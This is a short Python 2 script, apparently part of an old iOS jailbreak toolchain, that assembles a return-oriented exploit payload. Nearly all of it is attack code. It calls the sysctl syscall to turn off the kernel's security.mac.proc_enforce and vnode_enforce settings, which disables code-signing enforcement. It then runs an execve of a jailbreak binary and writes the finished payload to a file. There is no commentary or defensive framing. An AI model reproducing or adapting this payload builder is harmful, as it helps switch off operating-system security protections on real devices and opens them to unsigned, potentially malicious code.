#!/opt/local/bin/python2.6
import sys
import dmini
dmini.init(sys.argv[1:])
from world1 import *

init('R7', 'PC')
set_sp_to(0x11000000) # unixthread is a meanie
heapadd(fwd('R7'), fwd('PC'))
make_avail()

zero = ptrI(0)

name2oid_oid = ptrI(0, 3)
real_oid = ptrI(0, 0, 0)
oidlenp = ptrI(56)

def s(name):
    funcall('_syscall', 202, name2oid_oid, 2, real_oid, oidlenp, ptr(name, True), len(name))
    # the id might change, but the length won't- it's 3
    funcall('_syscall', 202, real_oid, 3, 0, 0, zero, 4)

s('security.mac.proc_enforce')
s('security.mac.vnode_enforce')

jailbreak = ptr('/Library/Jailbreak/catalog2', True)
funcall('_syscall', 59, jailbreak, ptrI(jailbreak, 0), ptrI(0)) # execve

final = finalize(0x11000000 - 8)
#(for debug)
heapdump()

open('just_sysctl_output.txt', 'w').write(final)
